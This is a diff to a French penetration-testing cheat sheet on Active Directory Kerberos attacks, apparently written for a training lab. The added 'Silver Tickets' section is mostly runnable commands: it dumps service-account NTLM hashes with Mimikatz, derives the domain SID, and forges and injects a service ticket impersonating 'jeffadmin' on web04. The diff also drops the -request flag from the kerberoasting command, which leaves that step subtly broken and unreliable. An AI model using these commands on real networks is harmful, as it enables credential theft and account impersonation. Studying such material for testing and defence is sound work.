@@ -214,7 +214,7 @@ nxc ldap <IP_DC> -u <user> -p <password> --kdcHost <IP_DC> --kerberoasting kerbe
 **Depuis Kali — impacket**
 
 ```bash
-impacket-GetUserSPNs -request -dc-ip <IP_DC> corp.com/<user>:<password> -outputfile hashes.kerberoast
+impacket-GetUserSPNs -dc-ip <IP_DC> corp.com/<user>:<password> -outputfile hashes.kerberoast
 ```
 
 > Erreur `KRB_AP_ERR_SKEW` → synchroniser l'heure avec le DC : `sudo ntpdate <IP_DC>`
@@ -289,4 +289,64 @@ Set-DomainObject -Identity victimuser -Clear serviceprincipalname
 ```
 
 > Toujours supprimer le SPN après exploitation pour ne pas laisser de vulnérabilité dans l'infra.
+
+### Silver Tickets
+
+Forger un service ticket (TGS) en utilisant le hash NTLM du compte de service. L'application cible vérifie le ticket localement (chiffré avec le hash du service) sans contacter le DC → accès avec les permissions de son choix.
+
+> La validation PAC (optionnelle) est rarement activée sur les services — l'attaque fonctionne dans la grande majorité des cas.
+
+**Informations requises**
+
+| Élément | Comment l'obtenir |
+|---|---|
+| Hash NTLM du compte de service | Mimikatz `sekurlsa::logonpasswords` (si session active sur la machine) |
+| Domain SID | `whoami /user` → retirer le RID (dernier `-XXXX`) |
+| SPN cible | `setspn -L <user>` ou `Get-NetUser -SPN` |
+
+**Récupérer le hash NTLM du service (Mimikatz)**
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+**Obtenir le Domain SID**
+
+```powershell
+whoami /user
+# ex: S-1-5-21-1987370270-658905905-1781884369-1105
+# Domain SID = S-1-5-21-1987370270-658905905-1781884369 (sans le RID final)
+```
+
+**Forger et injecter le Silver Ticket (Mimikatz)**
+
+```
+kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /target:<SPN_HOST> /service:<PROTOCOL> /rc4:<NTLM_HASH> /user:<USER> /ptt
+```
+
+```
+# Exemple — forger un ticket HTTP pour web04 en tant que jeffadmin
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin /ptt
+```
+
+> `/ptt` injecte directement le ticket en mémoire. Le module s'appelle `kerberos::golden` mais génère bien un **silver ticket** quand `/service` est spécifié (pas `krbtgt`).
+
+**Vérifier que le ticket est en mémoire**
+
+```powershell
+klist
+```
+
+**Utiliser le ticket**
+
+```powershell
+iwr -UseDefaultCredentials http://web04
+
+# Afficher le contenu complet de la page (source HTML)
+(iwr -UseDefaultCredentials http://web04).Content
+(iwr -UseDefaultCredentials http://web04).RawContent
+```
+
+> Patch Microsoft (octobre 2022) : le champ `PAC_REQUESTOR` doit être validé par le DC si client et KDC sont dans le même domaine — empêche de forger des tickets pour des users inexistants, mais pas pour des users valides.
 
